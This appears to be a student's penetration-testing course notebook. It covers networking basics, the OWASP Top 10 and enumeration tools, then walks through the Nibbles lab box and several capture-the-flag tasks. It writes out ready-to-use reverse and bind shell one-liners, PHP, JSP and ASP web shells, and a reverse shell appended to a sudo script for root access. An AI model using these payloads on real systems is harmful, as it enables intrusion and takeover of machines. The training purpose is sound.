# Notes

* confidentiality, integrity, and availability of data," or the CIA triad
* As previously discussed, banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated.
* As previously discussed, banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated. nmap and nc can do this
* When performing service scanning, we will often run into web servers running on ports 80 and 443

Step | Explanation
-----|-------------
Identifying the Risk | Identifying risks the business is exposed to, such as legal, environmental, market, regulatory, and other types of risks.
Analyze the Risk | Analyzing the risks to determine their impact and probability. The risks should be mapped to the organization's various policies, procedures, and business processes.
Evaluate the Risk | Evaluating, ranking, and prioritizing risks. Then, the organization must decide to accept (unavoidable), avoid (change plans), control (mitigate), or transfer risk (insure).
Dealing with Risk | Eliminating or containing the risks as best as possible. This is handled by interfacing directly with the stakeholders for the system or process that the risk is associated with.
Monitoring Risk | All risks must be constantly monitored. Risks should be constantly monitored for any situational changes that could change their impact score, i.e., from low to medium or high impact.


![Project Structure](pictures/Screenshot_20210904_102231.png)

## Types of shells

Shell Type | Description
-----------|------------
Reverse shell | Initiates a connection back to a "listener" on our attack box.
Bind shell | "Binds" to a specific port on the target host and waits for a connection from our attack box.
Web shell | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a PHP script to run a single command.

## Ports

* A port can be thought of as a window or door on a house (the house being a remote system), if a window or door is left open or not locked correctly, we can often gain unauthorized access to a home. 

Port(s) | Protocol
--------|---------
20/21 (TCP) | FTP
22 (TCP) | SSH
23 (TCP) | Telnet
25 (TCP) | SMTP
80 (TCP) | HTTP
161 (TCP/UDP) | SNMP
389 (TCP/UDP) | LDAP
443 (TCP) | SSL/TLS (HTTPS)
445 (TCP) | SMB
3389 (TCP) | RDP

## OWASP Top 10

1. 	Injection 	SQL injection, command injection, LDAP injection, etc.
2. 	Broken Authentication 	Authentication and session management misconfigurations can lead to unauthorized access to an application through password guessing attacks or improper session timeout, among other issues.
3. 	Sensitive Data Exposure 	Improperly protecting data such as financial, healthcare, or personally identifiable information.
4. 	XML External Entities (XXE) 	Poorly configured XML processors that can lead to internal file disclosure, port scanning, remote code execution, or denial of service attacks.
5. 	Broken Access Control 	Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc.
6. 	Security Misconfiguration 	Insecure default configurations, open cloud storage, verbose error messages which disclose too much information.
7. 	Cross-Site Scripting (XSS) 	XSS occurs when an application does not properly sanitize user-supplied input, allowing for the execution of HTML or JavaScript in a victim's browser. This can lead to session hijacking, website defacement, redirecting a user to a malicious website, etc.
8. 	Insecure Deserialization 	This flaw often leads to remote code execution, injection attacks, or privilege escalation attacks.
9. 	Using Components with Known Vulnerabilities 	All of the components used by an application (libraries, frameworks, software modules) run with the same privilege as the application. If the application uses components with known flaws, it may lead to sensitive data exposure or remote code execution.
10. 	Insufficient Logging & Monitoring 	Deficiencies in logging & monitoring may allow a successful attack to go unnoticed, for attackers to establish persistence in the network, or tamper with or extract sensitive data without being noticed.

## nmap scripts

* -sC is used to specify a script (default)
* ``` nmap --script <script name> -p<port> <host> ```

## ftp

* We see that FTP supports common commands such as cd and ls and allows us to download files using the get command. Inspection of the downloaded login.txt reveals credentials that we could use to further our access to the system.

## SMB
* MB (Server Message Block) is a prevalent protocol on Windows machines that provides many vectors for vertical and lateral movement. 
* some SMB versions may be vulnerable to RCE exploits such as EternalBlue
*  Nmap has many scripts for enumerating SMB, such as smb-os-discovery.nse, which will interact with the SMB service to extract the reported operating system version.

## Shares
* SMB allows users and administrators to share folders and make them accessible remotely by other users.
* A tool that can enumerate and interact with SMB shares is smbclient. The -L flag specifies that we want to retrieve a list of available shares on the remote host, while -N suppresses the password prompt.

## SNMP
* SNMP Community strings provide information and statistics about a router or device, helping us gain access to it.

## Gobuster

* For directory enumeration
* gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
* DNS Subdomain Enumeration
** Used to get things like admin pages gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt

## Banner Grabbing / Web Server Headers

In the last section, we discussed banner grabbing for general purposes. Web server headers provide a good picture of what is hosted on a web server. They can reveal the specific application framework in use, the authentication options, and whether the server is missing essential security options or has been misconfigured. We can use cURL to retrieve server header information from the command line. cURL is another essential addition to our penetration testing toolkit, and familiarity with its many options is encouraged

## WhatWeb

We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb. This information can help us pinpoint the technologies in use and begin to search for potential vulnerabilities.

## Metasploit

* run using ` msfconsole `
* ` search exploit <name> ` can be used to find an exploit
* ` show options` find what it needs/can do


## Types of Shells

Type of Shell | Method of Communication
--------------|-----------------------
Reverse Shell | Connects back to our system and gives us control through a reverse connection.
Bind Shell | Waits for us to connect to it and gives us control once we do.
Web Shell | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

* ``` nc -lvnp 1234 -> Starts a listener ```
* The Payload All The Things page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.
* Reverse extremely fragile so if connection is interrupted its over
* Another type of shell is a Bind Shell. Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.
* Upgrade to tty -> ```python -c 'import pty; pty.spawn("/bin/bash")'```
* The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

Web Server | Default Webroot
-----------|---------------
Apache 	| /var/www/html/
Nginx 	| /usr/local/nginx/html/
IIS 	| c:\inetpub\wwwroot\
XAMPP 	| C:\xampp\htdocs\

### Best webshell cmds
* PHP -> ```<?PHP system($_GET['cmd']);?>```
* JSP -> ```<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>```
* ASP -> ```<% eval request("cmd") %>```

### Best types of Bind Shells

* Linux -> ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f```
* python -> ```python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'```
* powershell -> ```powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();```

### Best commands for Reverse shells

* Windows -> ```powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()```

* Linux 1 -> ```bash -c 'bash -i >& /dev/TCP/10.10.10.10/1234 0>&1'```
* Linux 2 -> ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f```

## Privilege Escalastion
* https://book.hacktricks.xyz/ -> good checklist for what to look for to privilege escalate
* https://github.com/swisskyrepo/PayloadsAllTheThings -> good repo
* We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS.
* Another useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.
* Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.
* Next, we can look for files we can read and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us
* copy ssh keys -> ```  ssh user@10.10.10.10 -i id_rsa ```


## Transfering files

* One method is to use python to start a server and use wget to get the files -> `python3 -m http.server 8000`
* Could use SCP is you have an ssh connection
* If the remote host has firewall protections that won't let you transfer file you can use base64 to transfer. ->
  * `David Riddell@htb[/htb]$ base64 shell -w 0 f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU`
  * `user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell`
* To validate file you can fun the `file` command on them
* To check to see if you did the copy and paste right you can run `md5sum` on both machines files and see if they match

## Nibbles Walkthrough

### Enumeration

* nmap
  * `nmap -sV --open -oA nibbles_initial_scan 10.129.42.190` -> scan 1000 ports that are open and output XML and TEXT files
  * `nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190` -> was then run to see if any services are running on non-standard ports and will check 65535 TCP ports
  * while running above command (it takes a while) -> `nc -nv 10.129.42.190 22` to confirm
  * `nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.42.190.` -> this is then run so the defaults scripts can be executed. They are intrusive so be careful.
  * `nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.42.190 ` -> tried this after which will look for common web app directories.
  
#### TASK

1. `nmap -sV -sC -Pn <ip>`

### Web Footprinting

* Tried `whatweb 10.129.42.190`
* Then just went to the ip from the browser
* Check with `curl http://10.129.42.190` -> Finds a comment in the html
* `whatweb http://10.129.42.190/nibbleblog` 
* Go to */nibbleblog in firefox
* google nibbleblog exploit to find there is a php file upload exploit
* If we look at the source code of the Metasploit module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at /admin.php.
* `gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt` -> finds an admin page and a version number
* Browsing to nibbleblog/content shows some interesting subdirectories public, private, and tmp. Digging around for a while, we find a users.xml file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with cURL and prettify the XML output using xmllint. -> `curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -`
* `curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -`
* Checking it, hoping for passwords proofs fruitless, but we do see two mentions of nibbles in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?
When performing password cracking offline with a tool such as Hashcat or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as CeWL.

### Inital foothold

* Let us attempt to use this plugin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution. Code: php `<?php system('id'); ?>`
* `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>` ->  reverse shell
* `nc -lvnp 9443` -> to spawn
* cURL the image page again -> `curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/<fileName>.php`
* `python3 -c 'import pty; pty.spawn("/bin/bash")'` gives tty shell


### Privilege escalation
* `Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the personal.zip file and see a file called monitor.sh.`
* `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh ` on attack vm
* `sudo python3 -m http.server 8080` -> start server
* get the LinEnum.sh onto the server using wget -> `wget http://<your ip>:8080/LinEnum.sh`
* `chmod +x LinEnum.sh`
* `./LinEnum.sh`
* Find you can fun monitor.sh as sudo
* append to file `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.222 8443 >/tmp/f' | tee -a monitor.sh`
* `sudo /home/nibbler/personal/stuff/monitor.sh`
* start a nc `nc -lvnp 8443`
* `sudo /home/nibbler/personal/stuff/monitor.sh`
* find flag in ~/ as root

### Alternate User Method - Metasploit
* search nibbleblog
* `use 0`
* set the hosts


## Public Exploits (TASK)

1. scan the website using `gobuster` to find that it is a wordpress site
2. `msfconsole` to start metasploit
3. `search simple backup 2.7.10` found what to search by reading the website
4. use the exploit scanner on metasploit to read /flags.txt

## Privilege Escalation (TASK)

### Part 1

1. ```ssh user1@<ip> -p <port>```
2. ```sudo -l ``` which showed I can execute as user2
3. ```sudo -u /bin/bash``` spawned a new shell
4. Looked at /home/user2/flag.txt to get the flag

### Part 2

1. Found that I could read the /root/.ssh/id_rsa
2. copy and paste it to my machine
3. chmod 600
4. login with ```ssh root@<ip> -p <port> -i <keyyoufound>```
5. ```cat /root/flag.txt```



## Knowledge Check (TASK)

   1. `nmap -sV -sC -Pn <ip> -> found robots.txt`
   2. look at robots to find admin page
   3. try admin admin -> lets me log in
   4. see the version is below 3.3.15
   5. search on metasploit using `search getsimple 3.3.15` and use exploit 0
   6. set RHOST AND LHOST, then exploit
   7. use shell command to get a shell
   8. `python3 -c 'import pty; pty.spawn("/bin/bash")'` -> finally gets you a good shell
   9. `cd /`
   10. `cat mrb3n/user.txt` -> flag 1
   11. Look at gtfobins for php trying to get sudo
   12. `CMD="/bin/sh"`
   13. `sudo php -r "system('$CMD');"` -> now root
   14. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
   15. `cd /root`
   16. cat the file for flag